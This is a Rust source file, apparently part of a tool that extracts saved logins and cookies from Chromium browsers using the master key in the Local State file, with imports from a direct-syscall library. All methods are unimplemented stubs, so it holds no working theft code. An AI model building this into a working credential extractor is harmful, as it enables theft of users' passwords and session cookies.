use alloc::vec::Vec;
use wsyscall_rs::wintypes::WindowsString;

use crate::traits::Browser;

use super::{Cookie, Login};

#[derive(Debug)]
/// A structure representing a Chromium Browser.
///
/// The [Browser] trait is implemented to allow for dynamic dispatch of basic methods like retrieving logins, cookies, and decrypting data.
pub struct ChromiumBrowser {
    /// The User Data directory, containing the Local State file as well as all browser profiles.
    user_data_dir: WindowsString,
    /// The master key obtained from the Local State file, used in all encryption.
    master_key: Vec<u8>,
}

impl ChromiumBrowser {
    fn new(user_data_dir: WindowsString) -> crate::Result<Self> {
        Ok(ChromiumBrowser {
            user_data_dir,
            // Loki TODO: create function to read master key.
            master_key: Vec::new(),
        })
    }

    /// Constructs a new Chromium browser from a user data directory.
    pub fn from_user_data_dir(ud_dir: &WindowsString) -> crate::Result<Self> {
        ChromiumBrowser::new(ud_dir.clone())
    }
}

impl Browser for ChromiumBrowser {
    fn logins(&self) -> crate::Result<Vec<Login>> {
        todo!()
    }
    fn cookies(&self) -> crate::Result<Vec<Cookie>> {
        todo!()
    }
    fn decrypt(&self, encrypted_data: &[u8]) -> crate::Result<Vec<u8>> {
        todo!()
    }
}
